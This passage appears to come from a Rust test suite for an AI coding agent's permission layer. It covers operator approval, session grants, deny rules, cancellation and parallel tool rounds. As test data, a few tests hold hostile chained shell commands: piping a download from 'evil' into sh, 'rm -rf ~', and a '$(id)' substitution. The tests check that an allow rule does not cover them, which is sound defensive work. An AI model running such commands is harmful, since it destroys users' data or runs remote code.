        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"out.txt","content":"x"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::Deny);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out.contains("operator denied"));
        assert!(!dir.join("out.txt").exists());
        // D9: the ledger records a DENIED status, not error — refusal is
        // distinct from failure for audit purposes.
        let mut ledger = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            let bytes = std::fs::read(e.path()).unwrap_or_default();
            ledger.push_str(&String::from_utf8_lossy(&bytes));
        }
        assert!(
            ledger.contains("\"status\":\"denied\""),
            "denied verdict must record status=denied, got: {ledger}"
        );
    }

    fn write_once(
        home: &std::path::Path,
        cx: &orbit_tools::ToolContext,
        args: &[u8],
    ) -> (String, Option<FileChange>) {
        let mut ch = FixedChannel(ApprovalVerdict::AllowOnce);
        execute_call(
            home,
            "s1",
            "d1",
            &make_call("Write", args),
            false,
            true,
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
            cx,
        )
        .unwrap()
    }

    /// A file created from nothing is a change. It used to leave no event
    /// at all, so the commonest thing an agent does never reached the
    /// Changes or Review panel.
    #[test]
    fn a_created_file_is_reported_as_a_change() {
        let home = test_home("new-file");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let (out, change) = write_once(
            &home,
            &test_cx(&dir),
            br#"{"file_path":"notes.txt","content":"one\ntwo\n"}"#,
        );
        assert!(out.contains("\"ok\":true"), "{out}");
        let change = change.expect("a created file is a change");
        assert!(change.path.ends_with("notes.txt"), "{}", change.path);
        assert_eq!((change.added, change.removed), (2, 0));
        let hunks = change.hunks.expect("a diff against an empty before");
        assert!(hunks[0].lines.iter().all(|(m, _)| *m == '+'));
    }

    /// Overwriting keeps diffing against what was there.
    #[test]
    fn overwriting_a_file_diffs_against_its_old_content() {
        let home = test_home("overwrite");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("f.txt"), "a\nb\n").unwrap();
        // An existing file must be read in full, in this session, first.
        let cx = test_cx(&dir);
        let read = orbit_tools::registry()
            .into_iter()
            .find(|t| t.name() == "Read")
            .unwrap()
            .run(&serde_json::json!({ "file_path": "f.txt" }), &cx);
        assert!(!read.is_error, "{}", read.payload);
        let (out, change) = write_once(&home, &cx, br#"{"file_path":"f.txt","content":"a\nc\n"}"#);
        let change = change.unwrap_or_else(|| panic!("an overwrite is a change: {out}"));
        assert_eq!((change.added, change.removed), (1, 1));
    }

    /// A write that failed changed nothing: no event.
    #[test]
    fn a_failed_write_is_not_a_change() {
        let home = test_home("failed-write");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("plain"), "x").unwrap();
        // `plain` is a file, so nothing can be created under it.
        let (_, change) = write_once(
            &home,
            &test_cx(&dir),
            br#"{"file_path":"plain/inside.txt","content":"y"}"#,
        );
        assert!(change.is_none());
    }

    #[test]
    fn r_grant_allows_subsequent_calls_without_prompt() {
        // B4: R-grants apply to ask-class tools; Write asks in default
        // mode, so the grant (not the channel) approves the second call.
        let home = test_home("r-grant");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"a.txt","content":"1"}"#);

        // First call: R verdict → grant + execute.
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let (out1, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out1.contains("\"ok\":true"), "first write ran: {out1}");
        assert!(grants.is_granted("Write"));

        // Second call: auto-approved from the grant (channel not asked).
        let call2 = make_call("Write", br#"{"file_path":"b.txt","content":"2"}"#);
        let mut ch2 = FixedChannel(ApprovalVerdict::Deny); // would deny, but shouldn't be asked
        let (out2, _) = execute_call(
            &home,
            "s1",
            "d2",
            &call2,
            false,
            true,
            &mut ch2,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(
            dir.join("b.txt").exists(),
            "R-grant should auto-approve the second call: {out2}"
        );
    }

    #[test]
    fn deny_revokes_r_grant() {
        let home = test_home("revoke");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"c.txt","content":"x"}"#);

        // Grant via R.
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let _ = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(grants.is_granted("Write"));

        // Revoke explicitly (the operator pressed n → revoke path).
        grants.revoke("Write");
        assert!(!grants.is_granted("Write"));

        // Now the channel is asked again — deny.
        let mut ch2 = FixedChannel(ApprovalVerdict::Deny);
        let call2 = make_call("Write", br#"{"file_path":"d.txt","content":"y"}"#);
        let (out, _) = execute_call(
            &home,
            "s1",
            "d2",
            &call2,
            false,
            true,
            &mut ch2,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out.contains("operator denied"));
        assert!(!dir.join("d.txt").exists());
        assert!(!grants.is_granted("Write"));
    }

    #[test]
    fn r_grant_does_not_apply_to_unknown_tools() {
        let home = test_home("r-unknown");
        let call = make_call("shell", br#"{"cmd":"id"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("unknown tool"));
        assert!(
            !grants.is_granted("shell"),
            "unknown tool should not be granted"
        );
    }

    #[test]
    fn r_grant_is_per_tool() {
        // B4: grants are per-tool-name; an R on Write does not leak to
        // Edit. Edit asks the channel on its own.
        let home = test_home("r-per-tool");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let write = make_call("Write", br#"{"file_path":"e.txt","content":"x"}"#);

        // Grant the whole tool for the session (the web "session" verdict).
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let _ = execute_call(
            &home,
            "s1",
            "d1",
            &write,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(grants.is_granted("Write"));
        assert!(
            !grants.is_granted("Edit"),
            "a Write grant should not cover Edit"
        );

        // Edit should still ask the channel.
        let mut ch2 = FixedChannel(ApprovalVerdict::Deny);
        let edit = make_call(
            "Edit",
            br#"{"file_path":"e.txt","old_string":"x","new_string":"y"}"#,
        );
        let (out, _) = execute_call(
            &home,
            "s1",
            "d2",
            &edit,
            false,
            true,
            &mut ch2,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out.contains("operator denied"), "the channel must be asked");
        assert!(!grants.is_granted("Edit"), "a Deny must not create a grant");
    }

    #[test]
    fn revoke_all_clears_grants() {
        let mut grants = AutoGrants::new();
        grants.grant("calculator");
        grants.grant("list_models");
        assert_eq!(grants.granted_tools().len(), 2);
        grants.revoke_all();
        assert!(grants.granted_tools().is_empty());
    }

    #[test]
    fn ledger_records_r_grant_reason() {
        let home = test_home("r-ledger");
        let call = make_call("calculator", br#"{"expression":"2+2"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let _ = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();

        let mut ledger = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            let bytes = std::fs::read(e.path()).unwrap_or_default();
            ledger.push_str(&String::from_utf8_lossy(&bytes));
        }
        // The first call's verdict should be "operator approved" (the R grant
        // is applied, and the reason reflects approval).
        assert!(ledger.contains("operator approved") || ledger.contains("R-grant"));
    }
}

#[cfg(test)]
mod cancel_tests {
    use super::*;
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};

    fn call(i: u32) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: i,
            id: format!("c{i}"),
            name: "Bash".into(),
            arguments: br#"{"command":"true"}"#.to_vec(),
        }
    }

    fn cx() -> orbit_tools::ToolContext {
        let d = std::env::temp_dir();
        orbit_tools::ToolContext::new(d.clone(), "cancel-test".into(), d)
    }

    /// After Esc, only the call in flight was killed; the next calls of
    /// the round still ran (a second Bash command ran to completion).
    /// Now the rest are answered "cancelled by user" and never start.
    #[test]
    fn calls_after_esc_do_not_run_and_say_so() {
        let cx = cx();
        let flag = Arc::new(AtomicBool::new(false));
        let f = flag.clone();
        cx.push_cancel_check(Arc::new(move || f.load(Ordering::SeqCst)));
        let calls = [call(0), call(1), call(2)];
        let (mut ran, mut skipped) = (Vec::new(), Vec::new());
        let results = run_until_cancelled(
            &cx,
            &calls,
            |c| {
                ran.push(c.id.clone());
                // Esc arrives while the first call is running.
                flag.store(true, Ordering::SeqCst);
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: r#"{"ok":false,"error":"cancelled by user"}"#.into(),
                }
            },
            |c| skipped.push(c.id.clone()),
        );
        assert_eq!(ran, ["c0"], "only the call in flight ran");
        assert_eq!(skipped, ["c1", "c2"], "the rest were skipped, in order");
        assert_eq!(
            results.len(),
            3,
            "every call gets a result: the transcript stays valid"
        );
        for r in &results[1..] {
            assert!(orbit_tools::result_is_error(&r.content));
            assert!(
                !orbit_tools::result_is_denial(&r.content),
                "not a policy refusal"
            );
            assert!(r.content.contains("cancelled by user"));
        }
        assert_eq!(results[1].call_id, "c1");
    }

    #[test]
    fn without_a_cancel_every_call_runs() {
        let cx = cx();
        let calls = [call(0), call(1)];
        let mut ran = 0;
        let results = run_until_cancelled(
            &cx,
            &calls,
            |c| {
                ran += 1;
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            |_| panic!("nothing is skipped"),
        );
        assert_eq!((ran, results.len()), (2, 2));
    }

    /// The scope helper points a context at the token and pops cleanly.
    #[test]
    fn a_cancel_scope_follows_the_token_and_closes() {
        let cx = cx();
        let token = orbit_provider_http::CancelToken::new();
        begin_cancel_scope(&cx, &token);
        assert!(!cx.is_cancelled());
        token.cancel();
        assert!(
            cx.is_cancelled(),
            "cancelling the token cancels the context"
        );
        cx.pop_cancel_check();
        assert!(!cx.is_cancelled(), "the scope is closed");
    }

    fn ro_call(i: u32, name: &str) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: i,
            id: format!("c{i}"),
            name: name.into(),
            arguments: br#"{}"#.to_vec(),
        }
    }

    /// A round of parallel-safe read-only calls runs concurrently: the
    /// second call starts before the first finishes (the runner blocks
    /// until it sees both in flight). This is the throughput claim —
    /// a round of Reads is one wave, not a queue.
    #[test]
    fn parallel_safe_calls_run_concurrently() {
        let cx = cx();
        let calls = [ro_call(0, "Read"), ro_call(1, "Read"), ro_call(2, "Grep")];
        let barrier = Arc::new(std::sync::Barrier::new(3));
        let entered = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let results = run_round_parallel(
            &cx,
            &calls,
            |c| orbit_engine::ToolRoundResult {
                call_id: c.id.clone(),
                content: "{}".into(),
            },
            {
                let barrier = barrier.clone();
                let entered = entered.clone();
                move |c| {
                    entered.fetch_add(1, Ordering::SeqCst);
                    // All three must be in flight together; if the
                    // round were sequential this deadlocks the test
                    // (the barrier times out via panic on the third
                    // wait — the count assertion is the real check).
                    let _ = barrier.wait();
                    orbit_engine::ToolRoundResult {
                        call_id: c.id.clone(),
                        content: "{}".into(),
                    }
                }
            },
            |_| {},
        );
        assert_eq!(
            entered.load(Ordering::SeqCst),
            3,
            "all three read-only calls entered the runner"
        );
        // The model's order is preserved in the results.
        assert_eq!(
            results
                .iter()
                .map(|r| r.call_id.clone())
                .collect::<Vec<_>>(),
            ["c0", "c1", "c2"]
        );
    }

    /// Results come back in the model's order even when the calls
    /// finish out of order: the slow first Read lands first in the
    /// results, the fast ones after it.
    #[test]
    fn parallel_results_return_in_the_models_order() {
        let cx = cx();
        let calls = [ro_call(0, "Read"), ro_call(1, "Read"), ro_call(2, "Read")];
        let results = run_round_parallel(
            &cx,
            &calls,
            |c| orbit_engine::ToolRoundResult {
                call_id: c.id.clone(),
                content: "{}".into(),
            },
            |c| {
                // c0 is the slow one; c1 and c2 return at once.
                if c.id == "c0" {
                    std::thread::sleep(std::time::Duration::from_millis(60));
                }
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: format!(r#"{{"id":"{}"}}"#, c.id),
                }
            },
            |_| {},
        );
        let ids: Vec<&str> = results.iter().map(|r| r.call_id.as_str()).collect();
        assert_eq!(ids, ["c0", "c1", "c2"]);
        // And each result is its own call's, not its neighbour's.
        assert!(results[0].content.contains("c0"));
        assert!(results[2].content.contains("c2"));
    }

    /// A mixed round keeps the writes sequential and in order: the
    /// Bash call runs on the calling thread (the front-end's own
    /// executor). The Reads around it are lone calls (not adjacent),
    /// so they run sequentially too — a wave is a *run* of
    /// parallel-safe calls, because the model's order between a Read
    /// and a following Bash is semantic (the Bash may write what the
    /// next Read reads).
    #[test]
    fn mixed_round_runs_writes_sequentially_in_order() {
        let cx = cx();
        let calls = [ro_call(0, "Read"), ro_call(1, "Bash"), ro_call(2, "Read")];
        let order = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
        let seq_order = order.clone();
        let results = run_round_parallel(
            &cx,
            &calls,
            move |c| {
                seq_order.lock().unwrap().push(format!("seq:{}", c.id));
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            |c| orbit_engine::ToolRoundResult {
                call_id: c.id.clone(),
                content: "{}".into(),
            },
            |_| {},
        );
        let o = order.lock().unwrap().clone();
        assert_eq!(
            o,
            ["seq:c0", "seq:c1", "seq:c2"],
            "no adjacent run: the whole round is sequential, in order"
        );
        assert_eq!(
            results
                .iter()
                .map(|r| r.call_id.as_str())
                .collect::<Vec<_>>(),
            ["c0", "c1", "c2"]
        );
    }

    /// The wave shape the model actually emits: a run of Reads, then
    /// a write, then another run of Reads. Each run is one wave; the
    /// write between them is sequential.
    #[test]
    fn adjacent_runs_are_waves_and_the_write_between_is_sequential() {
        let cx = cx();
        let calls = [
            ro_call(0, "Read"),
            ro_call(1, "Read"),
            ro_call(2, "Bash"),
            ro_call(3, "Read"),
            ro_call(4, "Read"),
        ];
        let order = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
        let seq_order = order.clone();
        let wave = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let wave_count = wave.clone();
        let results = run_round_parallel(
            &cx,
            &calls,
            move |c| {
                seq_order.lock().unwrap().push(format!("seq:{}", c.id));
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            move |c| {
                wave_count.fetch_add(1, Ordering::SeqCst);
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            |_| {},
        );
        assert_eq!(
            order.lock().unwrap().clone(),
            ["seq:c2"],
            "only the Bash ran on the sequential executor"
        );
        assert_eq!(
            wave.load(Ordering::SeqCst),
            4,
            "both runs of Reads ran as waves (4 worker executions)"
        );
        assert_eq!(
            results
                .iter()
                .map(|r| r.call_id.as_str())
                .collect::<Vec<_>>(),
            ["c0", "c1", "c2", "c3", "c4"]
        );
    }

    /// Esc during a wave: the wave's calls are in flight and finish
    /// (Read/Grep are quick), but the calls after the wave never
    /// start — they are answered "cancelled by user".
    #[test]
    fn esc_after_a_wave_skips_the_rest() {
        let cx = cx();
        let flag = Arc::new(AtomicBool::new(false));
        let f = flag.clone();
        let f2 = flag.clone();
        cx.push_cancel_check(Arc::new(move || f.load(Ordering::SeqCst)));
        let calls = [
            ro_call(0, "Read"),
            ro_call(1, "Read"),
            ro_call(2, "Bash"),
            ro_call(3, "Read"),
        ];
        let mut skipped = Vec::new();
        let results = run_round_parallel(
            &cx,
            &calls,
            |c| orbit_engine::ToolRoundResult {
                call_id: c.id.clone(),
                content: "{}".into(),
            },
            {
                let f = f2;
                move |c| {
                    // Esc lands while the wave is in flight.
                    f.store(true, Ordering::SeqCst);
                    orbit_engine::ToolRoundResult {
                        call_id: c.id.clone(),
                        content: "{}".into(),
                    }
                }
            },
            |c| skipped.push(c.id.clone()),
        );
        // The wave (c0, c1) ran; the Bash and the Read after it never
        // started.
        assert_eq!(skipped, ["c2", "c3"]);
        assert_eq!(results.len(), 4, "every call gets a result");
        assert!(results[2].content.contains("cancelled by user"));
        assert!(results[3].content.contains("cancelled by user"));
    }

    /// A single parallel-safe call in a round is not a wave: it runs
    /// on the sequential executor (no thread for one call).
    #[test]
    fn a_lone_read_is_not_a_wave() {
        let cx = cx();
        let calls = [ro_call(0, "Read"), ro_call(1, "Bash")];
        let ran_seq = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
        let seq = ran_seq.clone();
        let results = run_round_parallel(
            &cx,
            &calls,
            move |c| {
                seq.lock().unwrap().push(c.id.clone());
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            |c| orbit_engine::ToolRoundResult {
                call_id: c.id.clone(),
                content: "{}".into(),
            },
            |_| {},
        );
        assert_eq!(
            ran_seq.lock().unwrap().clone(),
            ["c0", "c1"],
            "both calls ran sequentially, in the model's order"
        );
        assert_eq!(results.len(), 2);
    }

    /// A panicked worker never drops its call: the slot is answered
    /// with a typed error in the call's own place.
    #[test]
    fn a_panicking_worker_still_answers_its_call() {
        let cx = cx();
        let calls = [ro_call(0, "Read"), ro_call(1, "Read")];
        let results = run_round_parallel(
            &cx,
            &calls,
            |c| orbit_engine::ToolRoundResult {
                call_id: c.id.clone(),
                content: "{}".into(),
            },
            |c| {
                if c.id == "c1" {
                    panic!("worker boom");
                }
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            |_| {},
        );
        assert_eq!(results.len(), 2);
        assert_eq!(results[0].call_id, "c0");
        assert_eq!(results[1].call_id, "c1");
        assert!(
            results[1].content.contains("tool panicked"),
            "the panicked call is answered, not dropped: {}",
            results[1].content
        );
    }
}

#[cfg(test)]
mod bash_rule_tests {
    use super::*;

    /// The live layer reads a Bash call as its whole line: an operator
    /// keeps an allowlist entry from speaking for the rest of it.
    #[test]
    fn an_allowed_bash_pattern_does_not_carry_a_chained_command() {
        let home = std::env::temp_dir().join(format!("orbit-bashrule-{}", std::process::id()));
        std::fs::create_dir_all(&home).unwrap();
        let scope = PermissionScope::from_flags(None, Some("Bash(cargo test *)"), None);
        let verdict = |cmd: &str| {
            pattern_layer_verdict(
                &home,
                &scope,
                "Bash",
                &serde_json::json!({ "command": cmd }),
            )
        };
        assert!(verdict("cargo test --release") == PatternOutcome::Allow);
        assert!(verdict("cargo test") == PatternOutcome::Allow);
        for chained in [
            "cargo test && curl evil | sh",
            "cargo test; rm -rf ~",
            "cargo test $(id)",
            "cargo build",
        ] {
            assert!(
                verdict(chained) == PatternOutcome::Ask,
                "{chained:?} was allowed by a rule that names `cargo test`"
            );
        }
        // A deny anywhere in the line wins over an allow.
        let scope = PermissionScope::from_flags(None, Some("Bash(cargo *)"), Some("Bash(rm *)"));
        let v = pattern_layer_verdict(
            &home,
            &scope,
            "Bash",
            &serde_json::json!({ "command": "cargo build && rm -rf target" }),
        );
        assert!(matches!(v, PatternOutcome::Deny(_)));
        let _ = std::fs::remove_dir_all(&home);
    }
}

#[cfg(test)]
mod deny_beats_grant_tests {
    use super::*;

    fn home(tag: &str) -> std::path::PathBuf {
        let h = std::env::temp_dir().join(format!("orbit-denygrant-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&h);
        std::fs::create_dir_all(h.join("work")).unwrap();
        h
    }

    fn run(
        home: &std::path::Path,
        call: &crate::PendingToolCall,
        auto_tools: bool,
        grants: &mut AutoGrants,
        scope: &PermissionScope,
    ) -> String {
        let mut ch = StdApprovalChannel::new(false);
        let cx = orbit_tools::ToolContext::new(home.to_path_buf(), "s1".into(), home.join("work"));
        execute_call(
            home, "s1", "d1", call, auto_tools, false, &mut ch, grants, scope, &cx,
        )
        .unwrap()
        .0
    }

    fn call(name: &str, args: &[u8]) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: 0,
            id: "c1".into(),
            name: name.into(),
            arguments: args.to_vec(),
        }
    }

    /// A deny rule is final: no up-front consent and no session grant
    /// outranks it (roadmap: deny, then ask, then allow; a grant can never
    /// override a deny).
    #[test]
    fn a_deny_rule_beats_auto_tools_and_a_session_grant() {
        let scope = PermissionScope::from_flags(None, None, Some("Write"));
        // --auto-tools
        let h = home("auto");
        let out = run(
            &h,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            true,
            &mut AutoGrants::new(),
            &scope,
        );
        assert!(
            !h.join("work/out.txt").exists(),
            "--auto-tools wrote past a deny rule: {out}"
        );
        // An R grant made earlier in the session.
        let h = home("grant");
        let mut grants = AutoGrants::new();
        grants.grant("Write");
        let out = run(
            &h,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            false,
            &mut grants,
            &scope,
        );
        assert!(
            !h.join("work/out.txt").exists(),
            "a session grant wrote past a deny rule: {out}"
        );
    }
}

#[cfg(test)]
mod grant_tests {
    use super::*;
    use orbit_tools::permissions::{FolderTrust, PermissionMode};

    fn dirs(tag: &str) -> (std::path::PathBuf, std::path::PathBuf) {
        let base = std::env::temp_dir().join(format!("orbit-grants-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let home = base.join("home");
        let project = base.join("project");
        std::fs::create_dir_all(&home).unwrap();
        std::fs::create_dir_all(&project).unwrap();
        (home, project)
    }

    fn call(name: &str, args: &[u8]) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: 0,
            id: "c1".into(),
            name: name.into(),
            arguments: args.to_vec(),
        }
    }

    /// Answers from a script and keeps what it was asked.
    struct Scripted {
        answers: Vec<ApprovalVerdict>,
        asked: Vec<ApprovalRequest>,
        note: Option<String>,
    }
    impl Scripted {
        fn new(answers: &[ApprovalVerdict]) -> Self {
            Self {
                answers: answers.iter().rev().copied().collect(),
                asked: Vec::new(),
                note: None,
            }
        }
    }
    impl ApprovalChannel for Scripted {
        fn ask(&mut self, req: &ApprovalRequest, _auto: bool) -> ApprovalVerdict {
            self.asked.push(req.clone());
            self.answers.pop().unwrap_or(ApprovalVerdict::Deny)
        }
        fn take_note(&mut self) -> Option<String> {
            self.note.take()
        }
    }

    fn run(
        home: &std::path::Path,
        project: &std::path::Path,
        c: &crate::PendingToolCall,
        ch: &mut Scripted,
        grants: &mut AutoGrants,
        scope: &PermissionScope,
    ) -> String {
        let cx =
            orbit_tools::ToolContext::new(home.to_path_buf(), "s1".into(), project.to_path_buf());
        execute_call(home, "s1", "d1", c, false, true, ch, grants, scope, &cx)
            .unwrap()
            .0
    }

    fn ledger_text(home: &std::path::Path) -> String {
        let mut text = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            text.push_str(&String::from_utf8_lossy(
                &std::fs::read(e.path()).unwrap_or_default(),
            ));
        }
        text
    }

    #[test]
    fn what_the_card_offers_is_narrow_and_only_where_it_asks() {
        let (home, project) = dirs("offer");
        let scope = PermissionScope::default();
        let offer = |tool: &str, args: serde_json::Value| {
            grant_offer(&home, &scope, &project, tool, &args).map(|o| o.rule)
        };
        let bash = |c: &str| offer("Bash", serde_json::json!({ "command": c }));
        assert_eq!(
            bash("cargo test --release"),
            Some("Bash(cargo test *)".into())
        );
        assert_eq!(bash("git status"), Some("Bash(git status *)".into()));
        // Anything that runs what it is given, or reaches out: the line.
        assert_eq!(
            bash("python3 test_calc.py"),
            Some("Bash(python3 test_calc.py)".into())
        );
        assert_eq!(
            bash("git push origin main"),
            Some("Bash(git push origin main)".into())
        );
        assert_eq!(
            bash("cargo test && rm x"),
            Some("Bash(cargo test && rm x)".into())
        );
        // A literal star has no spelling in a rule: nothing to offer.
        assert_eq!(bash("rm *.o"), None);
        // Tools keyed by a path or a host.
        assert_eq!(
            offer(
                "Write",
                serde_json::json!({ "file_path": "out.txt", "content": "x" })
            ),
            Some("Write(out.txt)".into())
        );
        assert_eq!(
            offer(
                "Edit",
                serde_json::json!({ "file_path": "src/a.rs", "old_string": "a", "new_string": "b" })
            ),
            Some("Edit(src/a.rs)".into())
        );
        assert_eq!(
            offer(
                "Write",
                serde_json::json!({ "file_path": "*.txt", "content": "x" })
            ),
            None
        );
        assert_eq!(
            offer("calculator", serde_json::json!({ "expression": "1+1" })),
            None
        );
        // Where nothing is asked, nothing is offered.
        for mode in [
            PermissionMode::Plan,
            PermissionMode::DontAsk,
            PermissionMode::Bypass,
        ] {
            let scope = PermissionScope {
                mode,
                ..Default::default()
            };
            assert!(
                grant_offer(
                    &home,
                    &scope,
                    &project,
                    "Bash",
                    &serde_json::json!({ "command": "ls x" })
                )
                .is_none(),
                "{mode:?}"
            );
        }
        let scope = PermissionScope {
            mode: PermissionMode::AcceptEdits,
            ..Default::default()
        };
        assert!(
            grant_offer(
                &home,
                &scope,
                &project,
                "Bash",
                &serde_json::json!({ "command": "ls x" })
            )
            .is_some()
        );
    }

    /// `a` is offered as savable only in a folder that is trusted, since
    /// only there is the file read back.
    #[test]
    fn saving_is_offered_only_in_a_trusted_folder() {
        let (home, project) = dirs("trustoffer");
        let args = serde_json::json!({ "command": "cargo test" });
        let scope = PermissionScope::default();
        let o = grant_offer(&home, &scope, &project, "Bash", &args).unwrap();
        assert!(!o.can_save);
        FolderTrust::new(home.clone()).trust(&project).unwrap();
        let o = grant_offer(&home, &scope, &project, "Bash", &args).unwrap();
        assert!(o.can_save);
        assert_eq!(
            (o.tool.as_str(), o.pattern.as_str()),
            ("Bash", "cargo test *")
        );
    }

    #[test]
    fn s_remembers_the_rule_for_this_session_and_only_the_rule() {
        let (home, project) = dirs("session");
        let scope = PermissionScope::default();
        let mut grants = AutoGrants::new();
        let mut ch = Scripted::new(&[ApprovalVerdict::AllowRuleSession]);
        let w = |p: &str| {
            call(
                "Write",
                format!(r#"{{"file_path":"{p}","content":"x"}}"#).as_bytes(),
            )
        };
        // First call: asked, answered `s`.
        run(&home, &project, &w("out.txt"), &mut ch, &mut grants, &scope);
        assert_eq!(ch.asked.len(), 1);
        assert_eq!(
            ch.asked[0].grant.as_ref().map(|g| g.rule.as_str()),
            Some("Write(out.txt)")
        );
        assert!(project.join("out.txt").exists());
        // The same call again: no question.
        std::fs::remove_file(project.join("out.txt")).unwrap();
        run(&home, &project, &w("out.txt"), &mut ch, &mut grants, &scope);
        assert_eq!(ch.asked.len(), 1, "a granted rule asked again");
        assert!(project.join("out.txt").exists());
        // Another file: a new question (the channel's script is out, so it
        // denies).
        run(
            &home,
            &project,
            &w("other.txt"),
            &mut ch,
            &mut grants,
            &scope,
        );
        assert_eq!(ch.asked.len(), 2);
        assert!(!project.join("other.txt").exists());
        // The ledger holds neither the path nor the rule text.
        let ledger = ledger_text(&home);
        assert!(
            !ledger.contains("out.txt") && !ledger.contains("Write(out.txt)"),
            "{ledger}"
        );
        assert!(ledger.contains("rule granted for this session"), "{ledger}");
        assert!(
            ledger.contains("allowed by a rule granted this session"),
            "{ledger}"
        );
    }

    /// A rule granted for `cargo test *` is for that command, not for a
    /// line that merely starts with it.
    #[test]
    fn a_session_rule_does_not_carry_a_chained_line() {
        let mut grants = AutoGrants::new();
        grants.grant_rule("Bash", "cargo test *");
        assert!(grants.rule_granted("Bash", "cargo test --release"));
        assert!(!grants.rule_granted("Bash", "cargo test; rm -rf ~"));
        assert!(!grants.rule_granted("Bash", "cargo build"));
        assert!(!grants.rule_granted("Write", "cargo test --release"));
        grants.revoke_all();
        assert!(!grants.rule_granted("Bash", "cargo test --release"));
    }

    /// A deny rule outranks a rule granted a moment ago.
    #[test]
    fn a_deny_rule_beats_a_rule_grant() {
        let (home, project) = dirs("denygrant");
        let scope = PermissionScope::from_flags(None, None, Some("Write(out.txt)"));
        let mut grants = AutoGrants::new();
        grants.grant_rule("Write", "out.txt");
        let mut ch = Scripted::new(&[]);
        let out = run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut grants,
            &scope,
        );
        assert!(!project.join("out.txt").exists(), "{out}");
        assert!(ch.asked.is_empty(), "a denied call is not asked about");
        assert!(ledger_text(&home).contains("\"allowed\":false"));
    }

    #[test]
    fn a_saves_the_rule_in_a_trusted_folder_and_says_so_when_it_cannot() {
        // Trusted: the file is written.
        let (home, project) = dirs("save");
        FolderTrust::new(home.clone()).trust(&project).unwrap();
        let scope = PermissionScope::default();
        let mut ch = Scripted::new(&[ApprovalVerdict::AllowRuleAlways]);
        run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut AutoGrants::new(),
            &scope,
        );
        let saved = std::fs::read_to_string(project.join(".orbit/settings.local.toml")).unwrap();
        assert!(saved.contains("Write(out.txt)"), "{saved}");
